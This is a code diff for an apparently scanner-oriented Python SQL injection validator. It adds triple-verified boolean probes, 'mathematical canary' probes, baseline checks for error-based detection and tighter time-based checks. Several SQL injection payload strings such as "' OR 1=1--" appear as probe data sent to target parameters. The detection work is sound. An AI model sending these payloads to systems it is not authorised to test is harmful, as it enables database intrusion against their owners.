@@ -1,17 +1,19 @@
-"""SQL Injection Validation Engine (V5 §7, V4 §21).
+"""SQL Injection Validation Engine — Rewritten with Triple-Verification & Mathematical Canary.
 
-Upgraded to E3 Evidence Level:
-- Error-based: SQL error detection + database engine identification
-- Boolean-based: differential response analysis
-- Time-based: timing-based blind detection
-- UNION-based: column count detection (non-destructive)
+Upgraded to Zero False-Positive Architecture:
+- Error-based: SQL error detection + baseline disambiguation (normal input must NOT trigger same error)
+- Boolean-based: TRIPLE verification with 3 independent TRUE/FALSE probe pairs + mathematical canary
+- Time-based: Dual differential timing with zero-delay negative control
+- UNION-based: Column count detection (non-destructive)
 - Database engine fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
-- Impact matrix generation (C/I/A)
-- Professional PoC with curl reproduction command
+
+Evidence Levels:
+- E0/OBSERVED: Single signal without corroboration → observation only, not reported
+- E1/SUSPECTED: Error-based with error pattern match but unverified → LOW severity
+- E2/VALIDATED: Triple-verified boolean OR error-based with baseline disambiguation → HIGH severity
+- E3/CONFIRMED: Time-based double differential + UNION column count → CRITICAL severity
 
 Does NOT perform destructive database actions or bulk data extraction.
-Follows V5 §7: "minimum necessary evidence + clear impact explanation
-+ reproducible request + controlled result"
 """
 
 import hashlib
@@ -32,10 +34,17 @@ BOOLEAN_PROBES: List[Tuple[str, str]] = [
     ("' OR 1=1--", "' OR 1=2--"),          # Comment terminator
     ("1 OR 1=1", "1 OR 1=2"),              # Numeric boolean
     ("1) OR (1=1", "1) OR (1=2"),          # Parenthesized
-    ("')) OR 1=1--", "')) AND 1=2--"),     # Nested parenthesized (Node/Sequelize)
+    ("')) OR 1=1--", "')) AND 1=2--"),      # Nested parenthesized (Node/Sequelize)
     ("') OR 1=1--", "') AND 1=2--"),       # Single parenthesized
     ("' OR 'x'='x", "' OR 'x'='y"),       # String comparison
     ("1' AND 1=1#", "1' AND 1=2#"),        # MySQL comment
+]
+
+# Mathematical canary probes for confirmation after boolean detection
+MATH_CANARY_PROBES: List[Tuple[str, str, str]] = [
+    ("' OR 7*7=49--", "' OR 7*7=50--", "49"),         # Multiplication
+    ("' AND 3+4=7--", "' AND 3+4=8--", "7"),           # Addition
+    ("' OR 100/10=10--", "' OR 100/10=11--", "10"),    # Division
 ]
 
 # High-precision time probes: (probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, engine)
@@ -102,18 +111,13 @@ class SQLiCandidate:
 
 
 class SQLiValidator:
-    """Controlled SQL Injection validator upgraded to E3 evidence level.
+    """Zero false-positive SQL Injection validator with triple-verification.
 
-    Pipeline (V5 §7):
-        Parameter → Baseline → Controlled differential probe
-        → Response comparison → Database engine identification
-        → Column count (UNION, non-destructive)
-        → Impact demonstration → Evidence → PoC
-
-    Evidence progression:
-        Level 1: input changes application/database behavior
-        Level 2: controlled validation demonstrates database query manipulation
-        Level 3: controlled proof demonstrates unauthorized database-level impact
+    Pipeline:
+        Parameter → Baseline → Error-based (with baseline disambiguation)
+        → Boolean triple-verification → Mathematical canary confirmation
+        → Time-based dual differential → UNION column count
+        → Impact → Evidence → PoC
     """
 
     def __init__(self, timeout: float = 12.0, max_params: int = 30) -> None:
@@ -127,7 +131,7 @@ class SQLiValidator:
         *,
         headers: Optional[dict] = None,
     ) -> List[SQLiCandidate]:
-        """Test all parameters for SQL injection vulnerabilities."""
+        """Test all parameters for SQL injection with strict false-positive prevention."""
         candidates: List[SQLiCandidate] = []
 
         for param in parameters[:self.max_params]:
@@ -136,10 +140,10 @@ class SQLiValidator:
             if not name or location not in ("query", "body"):
                 continue
 
-            # 1. Error-based detection + DB engine fingerprinting
+            # 1. Error-based detection with baseline disambiguation
             error_candidate = await self._test_error_based(url, name, location, headers)
             if error_candidate:
-                # 1b. Attempt UNION column count for deeper proof (E3)
+                # Attempt UNION column count for deeper proof (E3)
                 if error_candidate.confidence in ("VALIDATED", "CONFIRMED"):
                     column_count = await self._test_union_columns(url, name, location, headers)
                     if column_count > 0:
@@ -152,14 +156,14 @@ class SQLiValidator:
                 candidates.append(error_candidate)
                 continue
 
-            # 2. Boolean-based differential detection
-            bool_candidate = await self._test_boolean_based(url, name, location, headers)
+            # 2. Boolean-based TRIPLE verification
+            bool_candidate = await self._test_boolean_triple(url, name, location, headers)
             if bool_candidate:
                 self._enrich_candidate(bool_candidate, url, name, location)
                 candidates.append(bool_candidate)
                 continue
 
-            # 3. Time-based blind detection (slower, use last with precision zero-delay control)
+            # 3. Time-based blind detection (slower, use last)
             time_candidate = await self._test_time_based(url, name, location, headers)
             if time_candidate:
                 self._enrich_candidate(time_candidate, url, name, location)
@@ -237,8 +241,21 @@ class SQLiValidator:
         location: str,
         headers: Optional[dict] = None,
     ) -> Optional[SQLiCandidate]:
-        """Test for SQL error messages in response + database engine fingerprinting."""
-        probe = "'"  # Single quote to trigger syntax error
+        """Test for SQL error messages with baseline disambiguation.
+
+        Key improvement: Send a NORMAL (non-SQLi) input first.
+        If normal input ALSO triggers SQL error pattern → it's a template/framework error page, NOT SQLi.
+        """
+        # Step 1: Baseline with normal input — check if error patterns appear without injection
+        baseline_resp = await self._send_request(url, param_name, "normalvalue12345", location, headers)
+        if baseline_resp:
+            baseline_body = baseline_resp.text
+            baseline_has_error = any(pattern.search(baseline_body) for pattern, _ in SQL_ERROR_PATTERNS)
+        else:
+            baseline_has_error = False
+
+        # Step 2: Send single-quote probe to trigger SQL syntax error
+        probe = "'"
         resp = await self._send_request(url, param_name, probe, location, headers)
         if not resp:
             return None
@@ -247,6 +264,14 @@ class SQLiValidator:
         for pattern, db_engine in SQL_ERROR_PATTERNS:
             match = pattern.search(body)
             if match:
+                # CRITICAL: If baseline also had SQL error patterns, this is NOT injection
+                if baseline_has_error:
+                    logger.debug(
+                        "SQLi: Error pattern '%s' also present in baseline response for param '%s' — false positive, skipping",
+                        match.group(0)[:50], param_name,
+                    )
+                    return None
+
                 # Try to extract database version
                 db_version = ""
                 if db_engine in DB_VERSION_PATTERNS:
@@ -268,26 +293,34 @@ class SQLiValidator:
                         "error_pattern": match.group(0)[:200],
                         "db_engine": db_engine,
                         "db_version": db_version or "not_disclosed",
+                        "baseline_clean": not baseline_has_error,
                         "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                         "evidence_level": "E2",
                     },
                 )
         return None
 
-    async def _test_boolean_based(
+    async def _test_boolean_triple(
         self,
         url: str,
         param_name: str,
         location: str,
         headers: Optional[dict] = None,
     ) -> Optional[SQLiCandidate]:
-        """Test for boolean-based blind injection via response differential."""
+        """Triple-verification boolean-based blind injection.
+
+        Requires at least 3 independent boolean probe pairs to ALL show consistent differential.
+        Then confirms with mathematical canary probe for E2→E3 upgrade.
+        """
         # Get baseline
         baseline_resp = await self._send_request(url, param_name, "1", location, headers)
         if not baseline_resp:
             return None
         baseline_len = len(baseline_resp.text)
         baseline_status = baseline_resp.status_code
+
+        # Need minimum 3 consistent differentials out of all probes
+        verified_probes: List[Tuple[str, str, int, int]] = []
 
         for true_probe, false_probe in BOOLEAN_PROBES:
             true_resp = await self._send_request(url, param_name, true_probe, location, headers)
@@ -305,26 +338,61 @@ class SQLiValidator:
                 and abs(true_len - baseline_len) < baseline_len * 0.1
                 and abs(false_len - baseline_len) > baseline_len * 0.2
             ):
-                return SQLiCandidate(
-                    url=url,
-                    parameter=param_name,
-                    location=location,
-                    technique="boolean",
-                    confidence="SUSPECTED",
-                    evidence={
-                        "true_probe": true_probe,
-                        "false_probe": false_probe,
-                        "baseline_length": baseline_len,
-                        "true_length": true_len,
-                        "false_length": false_len,
-                        "length_differential": abs(true_len - false_len),
-                        "baseline_status": baseline_status,
-                        "true_status": true_resp.status_code,
-                        "false_status": false_resp.status_code,
-                        "evidence_level": "E1",
-                    },
-                )
-        return None
+                verified_probes.append((true_probe, false_probe, true_len, false_len))
+
+            # Stop early if we have enough verified probes
+            if len(verified_probes) >= 3:
+                break
+
+        # TRIPLE VERIFICATION: Need at least 3 consistent differentials
+        if len(verified_probes) < 3:
+            return None
+
+        # Mathematical canary confirmation for E3 upgrade
+        canary_confirmed = False
+        canary_detail = ""
+        for canary_true, canary_false, expected_val in MATH_CANARY_PROBES:
+            true_resp = await self._send_request(url, param_name, canary_true, location, headers)
+            false_resp = await self._send_request(url, param_name, canary_false, location, headers)
+
+            if true_resp and false_resp:
+                true_len = len(true_resp.text)
+                false_len = len(false_resp.text)
+                # Mathematical canary: TRUE math should match baseline, FALSE should differ
+                if (
+                    abs(true_len - baseline_len) < baseline_len * 0.1
+                    and abs(false_len - baseline_len) > baseline_len * 0.15
+                ):
+                    canary_confirmed = True
+                    canary_detail = f"{canary_true} vs {canary_false}"
+                    break
+
+        confidence = "CONFIRMED" if canary_confirmed else "VALIDATED"
+        evidence_level = "E3" if canary_confirmed else "E2"
+
+        first_true, first_false, first_true_len, first_false_len = verified_probes[0]
+
+        return SQLiCandidate(
+            url=url,
+            parameter=param_name,
+            location=location,
+            technique="boolean",
+            confidence=confidence,
+            evidence={
+                "true_probe": first_true,
+                "false_probe": first_false,
+                "baseline_length": baseline_len,
+                "true_length": first_true_len,
+                "false_length": first_false_len,
+                "length_differential": abs(first_true_len - first_false_len),
+                "baseline_status": baseline_status,
+                "verified_probe_count": len(verified_probes),
+                "triple_verified": len(verified_probes) >= 3,
+                "math_canary_confirmed": canary_confirmed,
+                "math_canary_detail": canary_detail,
+                "evidence_level": evidence_level,
+            },
+        )
 
     async def _test_time_based(
         self,
@@ -333,7 +401,7 @@ class SQLiValidator:
         location: str,
         headers: Optional[dict] = None,
     ) -> Optional[SQLiCandidate]:
-        """Test for time-based blind injection via precision differential response timing and negative zero-delay control."""
+        """Time-based blind injection with precision dual-differential and zero-delay control."""
         # 1. Capture baseline timing
         t0 = time.monotonic()
         baseline_resp = await self._send_request(url, param_name, "1", location, headers)
@@ -343,7 +411,7 @@ class SQLiValidator:
             return None
 
         for probe_delay_1, probe_delay_2, probe_zero, delay1, delay2, db_engine in TIME_PROBES:
-            # 2. Test negative control (zero delay) — ensures server isn't simply lagging on any payload
+            # 2. Zero-delay negative control
             t0 = time.monotonic()
             resp_zero = await self._send_request(url, param_name, probe_zero, location, headers)
             time_zero = time.monotonic() - t0
@@ -351,22 +419,22 @@ class SQLiValidator:
             if not resp_zero:
                 continue
 
-            # If zero-delay probe itself takes too long (> 2x baseline + 1.2s), network is unstable; skip
+            # If zero-delay probe itself takes too long, network is unstable
             if time_zero > baseline_time + 1.2:
                 continue
 
-            # 3. Test primary sleep probe (e.g. 2.0s delay)
+            # 3. Primary sleep probe
             t0 = time.monotonic()
             resp1 = await self._send_request(url, param_name, probe_delay_1, location, headers)
             elapsed1 = time.monotonic() - t0
 
             if resp1 and elapsed1 >= (time_zero + delay1 * 0.8):
-                # 4. Verify with double-differential probe (e.g. 4.0s delay)
+                # 4. Double-differential verification probe
                 t0 = time.monotonic()
                 resp2 = await self._send_request(url, param_name, probe_delay_2, location, headers)
                 elapsed2 = time.monotonic() - t0
 
-                # Must scale proportionally: elapsed2 must be >= elapsed1 + (delay2 - delay1) * 0.7
+                # Must scale proportionally
                 if resp2 and elapsed2 >= (time_zero + delay2 * 0.75) and elapsed2 > elapsed1 + 0.8:
                     return SQLiCandidate(
                         url=url,
